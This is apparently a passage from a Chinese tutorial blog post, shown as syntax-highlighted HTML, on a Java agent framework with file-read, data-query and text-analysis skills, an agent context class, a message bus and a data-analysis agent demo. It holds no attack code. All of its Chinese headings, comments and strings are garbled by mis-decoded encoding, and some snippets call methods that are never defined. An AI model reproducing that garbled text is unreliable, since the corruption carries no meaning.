               (lowerTask.contains(<span class="hljs-string">"è¯»å–"</span>) || lowerTask.contains(<span class="hljs-string">"æ‰“å¼€"</span>) || lowerTask.contains(<span class="hljs-string">"æŸ¥çœ‹"</span>));
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">validate</span><span class="hljs-params">(String task, Map&lt;String, Object&gt; parameters)</span> {
        <span class="hljs-keyword">if</span> (!Skill.<span class="hljs-built_in">super</span>.validate(task, parameters)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }

        <span class="hljs-comment">// æ£€æŸ¥æ–‡ä»¶è·¯å¾„å‚æ•°</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> parameters.get(<span class="hljs-string">"filePath"</span>);
        <span class="hljs-keyword">if</span> (filePath == <span class="hljs-literal">null</span>) {
            logger.warn(<span class="hljs-string">"filePath parameter is missing"</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }

        <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(filePath.toString());
        <span class="hljs-keyword">if</span> (!Files.exists(path)) {
            logger.warn(<span class="hljs-string">"File does not exist: {}"</span>, filePath);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }

        <span class="hljs-keyword">if</span> (!Files.isReadable(path)) {
            logger.warn(<span class="hljs-string">"File is not readable: {}"</span>, filePath);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }

        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> SkillResult <span class="hljs-title function_">execute</span><span class="hljs-params">(String task, Map&lt;String, Object&gt; parameters)</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();

        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> parameters.get(<span class="hljs-string">"filePath"</span>).toString();

            logger.info(<span class="hljs-string">"Reading file: {}"</span>, filePath);

            <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(filePath);

            <span class="hljs-comment">// è¯»å–æ–‡ä»¶å†…å®¹</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Files.readAllBytes(path), StandardCharsets.UTF_8);

            <span class="hljs-comment">// è·å–æ–‡ä»¶ä¿¡æ¯</span>
            <span class="hljs-type">long</span> <span class="hljs-variable">fileSize</span> <span class="hljs-operator">=</span> Files.size(path);
            <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> path.getFileName().toString();

            <span class="hljs-comment">// æ„å»ºå…ƒæ•°æ®</span>
            Map&lt;String, Object&gt; metadata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.HashMap&lt;&gt;();
            metadata.put(<span class="hljs-string">"filePath"</span>, filePath);
            metadata.put(<span class="hljs-string">"fileName"</span>, fileName);
            metadata.put(<span class="hljs-string">"fileSize"</span>, fileSize);
            metadata.put(<span class="hljs-string">"lines"</span>, content.split(<span class="hljs-string">"\n"</span>).length);

            <span class="hljs-type">long</span> <span class="hljs-variable">executionTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis() - startTime;

            logger.info(<span class="hljs-string">"File read successfully: {} ({} bytes)"</span>, fileName, fileSize);

            <span class="hljs-keyword">return</span> SkillResult.success(
                    <span class="hljs-string">"æ–‡ä»¶è¯»å–æˆåŠŸ: "</span> + fileName,
                    content,
                    executionTime,
                    metadata
            );

        } <span class="hljs-keyword">catch</span> (IOException e) {
            logger.error(<span class="hljs-string">"Error reading file"</span>, e);
            <span class="hljs-keyword">return</span> SkillResult.failure(<span class="hljs-string">"æ–‡ä»¶è¯»å–å¤±è´¥: "</span> + e.getMessage(), e.getMessage());
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getTimeout</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-number">10000</span>; <span class="hljs-comment">// 10ç§’è¶…æ—¶</span>
    }

    <span class="hljs-comment">/**
     * è¯»å–æ–‡ä»¶è¡Œ
     */</span>
    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">readLines</span><span class="hljs-params">(String filePath)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(filePath);
        <span class="hljs-keyword">return</span> Files.readAllLines(path, StandardCharsets.UTF_8);
    }

    <span class="hljs-comment">/**
     * æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">exists</span><span class="hljs-params">(String filePath)</span> {
        <span class="hljs-keyword">return</span> Files.exists(Paths.get(filePath));
    }

    <span class="hljs-comment">/**
     * è·å–æ–‡ä»¶å¤§å°
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getFileSize</span><span class="hljs-params">(String filePath)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-keyword">return</span> Files.size(Paths.get(filePath));
    }
}

</code></pre>
<h4 data-id="heading-11">3.2 æ•°æ®æŸ¥è¯¢æŠ€èƒ½</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataQuerySkill</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Skill</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, List&lt;Map&lt;String, Object&gt;&gt;&gt; database;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DataQuerySkill</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">this</span>.database = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
        initializeSampleData();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">canExecute</span><span class="hljs-params">(String task)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">lowerTask</span> <span class="hljs-operator">=</span> task.toLowerCase();
        <span class="hljs-keyword">return</span> lowerTask.contains(<span class="hljs-string">"æŸ¥è¯¢"</span>) ||
               lowerTask.contains(<span class="hljs-string">"æ•°æ®"</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> SkillResult <span class="hljs-title function_">execute</span><span class="hljs-params">(String task, Map&lt;String, Object&gt; parameters)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">tableName</span> <span class="hljs-operator">=</span> parameters.get(<span class="hljs-string">"tableName"</span>).toString();
        <span class="hljs-type">String</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> parameters.get(<span class="hljs-string">"condition"</span>).toString();

        List&lt;Map&lt;String, Object&gt;&gt; results = performQuery(
            tableName, condition, <span class="hljs-number">100</span>
        );

        <span class="hljs-keyword">return</span> SkillResult.success(
            <span class="hljs-string">"æŸ¥è¯¢æˆåŠŸï¼Œæ‰¾åˆ°"</span> + results.size() + <span class="hljs-string">"æ¡è®°å½•"</span>,
            results
        );
    }
}
</code></pre>
<h4 data-id="heading-12">3.3 æ–‡æœ¬åˆ†ææŠ€èƒ½</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TextAnalysisSkill</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Skill</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> SkillResult <span class="hljs-title function_">execute</span><span class="hljs-params">(String task, Map&lt;String, Object&gt; parameters)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> parameters.get(<span class="hljs-string">"text"</span>).toString();
        <span class="hljs-type">String</span> <span class="hljs-variable">operation</span> <span class="hljs-operator">=</span> parameters.get(<span class="hljs-string">"operation"</span>).toString();

        <span class="hljs-keyword">switch</span> (operation) {
            <span class="hljs-keyword">case</span> <span class="hljs-string">"stats"</span>:
                <span class="hljs-keyword">return</span> analyzeStats(text);
            <span class="hljs-keyword">case</span> <span class="hljs-string">"keywords"</span>:
                <span class="hljs-keyword">return</span> extractKeywords(text);
            <span class="hljs-keyword">case</span> <span class="hljs-string">"sentiment"</span>:
                <span class="hljs-keyword">return</span> analyzeSentiment(text);
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">return</span> fullAnalysis(text);
        }
    }
}
</code></pre>
<h3 data-id="heading-13">å››ã€Agentäº¤äº’æœºåˆ¶</h3>
<h4 data-id="heading-14">4.1 æ—¶åºäº¤äº’</h4>
<p>Agentä¸Skillsä¹‹é—´çš„äº¤äº’éµå¾ªæ˜ç¡®çš„æ—¶åºå…³ç³»ï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9b67db1da034019b43c5a67137d13c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770429086&amp;x-signature=9sa%2F4iHlH2zwQJ2MD6Uck55Q9gk%3D" alt="" loading="lazy"/></p>
<ol>
<li>ç”¨æˆ·å‘Agentå‘é€ä»»åŠ¡è¯·æ±‚</li>
<li>AgentæŸ¥è¯¢Skill Registryè·å–å¯ç”¨æŠ€èƒ½</li>
<li>Registryè¿”å›åŒ¹é…çš„æŠ€èƒ½åˆ—è¡¨</li>
<li>Agentè°ƒç”¨å…·ä½“æŠ€èƒ½æ‰§è¡Œä»»åŠ¡</li>
<li>æŠ€èƒ½è¿”å›æ‰§è¡Œç»“æœ</li>
<li>Agentæ•´åˆç»“æœå¹¶è¿”å›ç»™ç”¨æˆ·</li>
</ol>
<h4 data-id="heading-15">4.2 ä¸Šä¸‹æ–‡ç®¡ç†</h4>
<p>AgentContextåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼ é€’å’Œå­˜å‚¨æ•°æ®ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.agent;

<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;
<span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;

<span class="hljs-comment">/**
 * Agentæ‰§è¡Œä¸Šä¸‹æ–‡
 * ç”¨äºåœ¨Agentæ‰§è¡Œè¿‡ç¨‹ä¸­ä¼ é€’å’Œå­˜å‚¨æ•°æ®
 * <span class="hljs-doctag">@version</span> 1.0.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentContext</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String requestId;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; attributes;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; sessionData;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> createdAt;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AgentContext</span><span class="hljs-params">(String requestId)</span> {
        <span class="hljs-built_in">this</span>.requestId = requestId;
        <span class="hljs-built_in">this</span>.attributes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
        <span class="hljs-built_in">this</span>.sessionData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
        <span class="hljs-built_in">this</span>.createdAt = System.currentTimeMillis();
    }

    <span class="hljs-comment">/**
     * è·å–è¯·æ±‚ID
     */</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getRequestId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> requestId;
    }

    <span class="hljs-comment">/**
     * è®¾ç½®å±æ€§
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAttribute</span><span class="hljs-params">(String key, Object value)</span> {
        attributes.put(key, value);
    }

    <span class="hljs-comment">/**
     * æ‰¹é‡è®¾ç½®å±æ€§
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAttributes</span><span class="hljs-params">(Map&lt;String, Object&gt; attributes)</span> {
        <span class="hljs-keyword">if</span> (attributes != <span class="hljs-literal">null</span>) {
            <span class="hljs-built_in">this</span>.attributes.putAll(attributes);
        }
    }

    <span class="hljs-comment">/**
     * è·å–å±æ€§
     */</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getAttribute</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-keyword">return</span> attributes.get(key);
    }

    <span class="hljs-comment">/**
     * è·å–å±æ€§ï¼ˆå¸¦ç±»å‹è½¬æ¢ï¼‰
     */</span>
    <span class="hljs-meta">@SuppressWarnings("unchecked")</span>
    <span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">getAttribute</span><span class="hljs-params">(String key, Class&lt;T&gt; type)</span> {
        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> attributes.get(key);
        <span class="hljs-keyword">if</span> (value != <span class="hljs-literal">null</span> &amp;&amp; type.isInstance(value)) {
            <span class="hljs-keyword">return</span> (T) value;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-comment">/**
     * ç§»é™¤å±æ€§
     */</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">removeAttribute</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-keyword">return</span> attributes.remove(key);
    }

    <span class="hljs-comment">/**
     * è®¾ç½®ä¼šè¯æ•°æ®
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSessionData</span><span class="hljs-params">(String key, Object value)</span> {
        sessionData.put(key, value);
    }

    <span class="hljs-comment">/**
     * è·å–ä¼šè¯æ•°æ®
     */</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getSessionData</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-keyword">return</span> sessionData.get(key);
    }

    <span class="hljs-comment">/**
     * è·å–æ‰€æœ‰å±æ€§
     */</span>
    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">getAllAttributes</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(attributes);
    }

    <span class="hljs-comment">/**
     * æ¸…ç©ºå±æ€§
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span> {
        attributes.clear();
    }

    <span class="hljs-comment">/**
     * è·å–ä¸Šä¸‹æ–‡åˆ›å»ºæ—¶é—´
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getCreatedAt</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> createdAt;
    }

    <span class="hljs-comment">/**
     * è·å–ä¸Šä¸‹æ–‡å­˜æ´»æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> System.currentTimeMillis() - createdAt;
    }

    <span class="hljs-comment">/**
     * åˆ›å»ºæ–°çš„ä¸Šä¸‹æ–‡
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> AgentContext <span class="hljs-title function_">create</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> create(generateRequestId());
    }

    <span class="hljs-comment">/**
     * åˆ›å»ºå¸¦è¯·æ±‚IDçš„ä¸Šä¸‹æ–‡
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> AgentContext <span class="hljs-title function_">create</span><span class="hljs-params">(String requestId)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AgentContext</span>(requestId);
    }

    <span class="hljs-comment">/**
     * ç”Ÿæˆè¯·æ±‚ID
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateRequestId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"req-"</span> + System.currentTimeMillis() + <span class="hljs-string">"-"</span> + Thread.currentThread().getId();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"AgentContext{"</span> +
                <span class="hljs-string">"requestId='"</span> + requestId + <span class="hljs-string">'\''</span> +
                <span class="hljs-string">", attributes="</span> + attributes.size() +
                <span class="hljs-string">", sessionData="</span> + sessionData.size() +
                <span class="hljs-string">", age="</span> + getAge() + <span class="hljs-string">"ms"</span> +
                <span class="hljs-string">'}'</span>;
    }
}

</code></pre>
<p>ä¸Šä¸‹æ–‡åˆ†ä¸ºä¸´æ—¶å±æ€§å’Œä¼šè¯æ•°æ®ï¼Œä¸´æ—¶å±æ€§åœ¨å•æ¬¡è¯·æ±‚ä¸­æœ‰æ•ˆï¼Œä¼šè¯æ•°æ®å¯ä»¥è·¨è¯·æ±‚å…±äº«ã€‚</p>
<h3 data-id="heading-16">äº”ã€å¤šAgentåä½œ</h3>
<h4 data-id="heading-17">5.1 åä½œæ¶æ„</h4>
<p>åœ¨å¤æ‚ç³»ç»Ÿä¸­ï¼Œå¤šä¸ªAgentååŒå·¥ä½œå¯ä»¥å®Œæˆæ›´å¤æ‚çš„ä»»åŠ¡ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa77a39164004687bab75b4510b31ab1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770429086&amp;x-signature=wUtShnqzeUn8ZXZtQR7Enb5aNoE%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>Agent Orchestrator</strong>ï¼šåè°ƒæ•´ä¸ªç³»ç»Ÿçš„è¿è¡Œ</li>
<li><strong>Message Bus</strong>ï¼šå®ç°Agenté—´çš„å¼‚æ­¥é€šä¿¡</li>
<li><strong>Specialized Agents</strong>ï¼šä¸“é—¨å¤„ç†ç‰¹å®šé¢†åŸŸçš„Agent</li>
</ul>
<h4 data-id="heading-18">5.2 æ¶ˆæ¯ä¼ é€’</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MessageBus</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, List&lt;Agent&gt;&gt; subscribers;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">publish</span><span class="hljs-params">(String topic, Message message)</span> {
        List&lt;Agent&gt; agents = subscribers.get(topic);
        <span class="hljs-keyword">for</span> (Agent agent : agents) {
            executor.submit(() -&gt;
                agent.execute(message.getContent(), message.getContext())
            );
        }
    }
}
</code></pre>
<h3 data-id="heading-19">å…­ã€å®æˆ˜æ¡ˆä¾‹ï¼šæ™ºèƒ½æ•°æ®åˆ†æç³»ç»Ÿ</h3>
<h4 data-id="heading-20">6.1 ç³»ç»Ÿè®¾è®¡</h4>
<p>æˆ‘ä»¬ä»¥ä¸€ä¸ªæ™ºèƒ½æ•°æ®åˆ†æç³»ç»Ÿä¸ºä¾‹ï¼Œå±•ç¤ºAgent Skillsçš„å®é™…åº”ç”¨ï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a8853fbcecc41c99e635eb5d607971c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770429086&amp;x-signature=WVHMAx%2B8YVw6VJzMgtcYY1GeYJU%3D" alt="" loading="lazy"/></p>
<p>ç³»ç»ŸåŒ…å«ä»¥ä¸‹å…³é”®ç»„ä»¶ï¼š</p>
<ul>
<li><strong>å‰ç«¯åº”ç”¨</strong>ï¼šWebç•Œé¢å’Œç§»åŠ¨ç«¯</li>
<li><strong>API Gateway</strong>ï¼šç»Ÿä¸€å…¥å£ï¼Œå¤„ç†è®¤è¯å’Œé™æµ</li>
<li><strong>Agent Layer</strong>ï¼šå¤šä¸ªä¸“é—¨çš„æ•°æ®å¤„ç†Agent</li>
<li><strong>Skills Layer</strong>ï¼š8ç§æ ¸å¿ƒæŠ€èƒ½</li>
<li><strong>Data Sources</strong>ï¼šå¤šç§æ•°æ®æºæ”¯æŒ</li>
</ul>
<h4 data-id="heading-21">6.2 æ•°æ®åˆ†æAgentå®ç°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.demo;

<span class="hljs-keyword">import</span> com.example.agent.Agent;
<span class="hljs-keyword">import</span> com.example.agent.AgentContext;
<span class="hljs-keyword">import</span> com.example.agent.BaseAgent;
<span class="hljs-keyword">import</span> com.example.skills.SkillResult;
<span class="hljs-keyword">import</span> com.example.skills.impl.DataQuerySkill;
<span class="hljs-keyword">import</span> com.example.skills.impl.FileReadSkill;
<span class="hljs-keyword">import</span> com.example.skills.impl.TextAnalysisSkill;
<span class="hljs-keyword">import</span> org.slf4j.Logger;
<span class="hljs-keyword">import</span> org.slf4j.LoggerFactory;

<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-comment">/**
 * æ•°æ®åˆ†æAgent
 * ä¸“é—¨å¤„ç†æ•°æ®åˆ†æç›¸å…³ä»»åŠ¡
 * <span class="hljs-doctag">@version</span> 1.0.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataAnalysisAgent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseAgent</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(DataAnalysisAgent.class);

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DataAnalysisAgent</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">super</span>(<span class="hljs-string">"DataAnalysisAgent"</span>, <span class="hljs-string">"æ•°æ®åˆ†ææ™ºèƒ½ä½“ï¼Œæä¾›æ•°æ®æŸ¥è¯¢ã€åˆ†æå’Œå¯è§†åŒ–èƒ½åŠ›"</span>);

        <span class="hljs-comment">// æ³¨å†ŒæŠ€èƒ½</span>
        registerSkill(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DataQuerySkill</span>());
        registerSkill(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TextAnalysisSkill</span>());
        registerSkill(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReadSkill</span>());
    }

    <span class="hljs-comment">/**
     * æ‰§è¡Œæ•°æ®åˆ†æä»»åŠ¡
     */</span>
    <span class="hljs-keyword">public</span> Agent.AgentResult <span class="hljs-title function_">analyzeData</span><span class="hljs-params">(String query, AgentContext context)</span> {
        logger.info(<span class="hljs-string">"[DataAnalysisAgent] Starting data analysis: {}"</span>, query);

        <span class="hljs-comment">// è®¾ç½®åˆ†æå‚æ•°</span>
        Map&lt;String, Object&gt; parameters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        parameters.put(<span class="hljs-string">"tableName"</span>, <span class="hljs-string">"users"</span>);
        parameters.put(<span class="hljs-string">"condition"</span>, query);
        parameters.put(<span class="hljs-string">"limit"</span>, <span class="hljs-number">100</span>);

        context.setAttributes(parameters);

        <span class="hljs-keyword">return</span> execute(<span class="hljs-string">"æŸ¥è¯¢ç”¨æˆ·æ•°æ®: "</span> + query, context);
    }

    <span class="hljs-comment">/**
     * ç”Ÿæˆæ•°æ®åˆ†ææŠ¥å‘Š
     */</span>
    <span class="hljs-keyword">public</span> Agent.AgentResult <span class="hljs-title function_">generateReport</span><span class="hljs-params">(String filePath, AgentContext context)</span> {
        logger.info(<span class="hljs-string">"[DataAnalysisAgent] Generating report from file: {}"</span>, filePath);

        Map&lt;String, Object&gt; parameters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        parameters.put(<span class="hljs-string">"filePath"</span>, filePath);

        context.setAttributes(parameters);

        <span class="hljs-type">AgentResult</span> <span class="hljs-variable">fileResult</span> <span class="hljs-operator">=</span> execute(<span class="hljs-string">"è¯»å–æ•°æ®æ–‡ä»¶"</span>, context);

        <span class="hljs-keyword">if</span> (fileResult.isSuccess()) {
            <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> fileResult.getData().toString();

            <span class="hljs-comment">// åˆ†ææ–‡æœ¬å†…å®¹</span>
            Map&lt;String, Object&gt; analysisParams = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
            analysisParams.put(<span class="hljs-string">"text"</span>, content);
            analysisParams.put(<span class="hljs-string">"operation"</span>, <span class="hljs-string">"analyze"</span>);

            context.setAttributes(analysisParams);

            <span class="hljs-keyword">return</span> execute(<span class="hljs-string">"åˆ†ææ–‡æœ¬å†…å®¹"</span>, context);
        }

        <span class="hljs-keyword">return</span> fileResult;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">preprocess</span><span class="hljs-params">(String task, AgentContext context)</span> {
        <span class="hljs-built_in">super</span>.preprocess(task, context);
        context.setAttribute(<span class="hljs-string">"agentType"</span>, <span class="hljs-string">"data-analysis"</span>);
        context.setAttribute(<span class="hljs-string">"timestamp"</span>, System.currentTimeMillis());
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postprocess</span><span class="hljs-params">(String task, SkillResult result, AgentContext context)</span> {
        <span class="hljs-built_in">super</span>.postprocess(task, result, context);

        <span class="hljs-comment">// è®°å½•åˆ†æç»“æœ</span>
        <span class="hljs-keyword">if</span> (result.isSuccess()) {
            context.setSessionData(<span class="hljs-string">"lastAnalysis"</span>, result.getData());
            context.setSessionData(<span class="hljs-string">"lastAnalysisTime"</span>, System.currentTimeMillis());
        }
    }
}

</code></pre>
<h4 data-id="heading-22">6.3 ä½¿ç”¨ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// åˆ›å»ºAgent</span>
        <span class="hljs-type">DataAnalysisAgent</span> <span class="hljs-variable">agent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataAnalysisAgent</span>();

        <span class="hljs-comment">// æ‰§è¡ŒæŸ¥è¯¢</span>
        <span class="hljs-type">AgentContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> AgentContext.create();
        <span class="hljs-type">AgentResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> agent.analyzeData(<span class="hljs-string">"æŠ€æœ¯éƒ¨"</span>, context);

        <span class="hljs-keyword">if</span> (result.isSuccess()) {
            System.out.println(<span class="hljs-string">"æŸ¥è¯¢ç»“æœ: "</span> + result.getData());
        }
    }
}
</code></pre>
<h3 data-id="heading-23">ä¸ƒã€ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²</h3>
<h4 data-id="heading-24">7.1 éƒ¨ç½²æ¶æ„</h4>
<p>ç”Ÿäº§ç¯å¢ƒéœ€è¦è€ƒè™‘é«˜å¯ç”¨ã€å¯æ‰©å±•å’Œç›‘æ§ï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7102076b5f88431797a5cc1f30f72c89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770429086&amp;x-signature=65uOAjmiVi%2FYteisNlbPq75Y8Oc%3D" alt="" loading="lazy"/></p>
<p>å…³é”®è®¾è®¡è¦ç‚¹ï¼š</p>
<ul>
<li><strong>è´Ÿè½½å‡è¡¡</strong>ï¼šä½¿ç”¨Nginxæˆ–äº‘è´Ÿè½½å‡è¡¡</li>
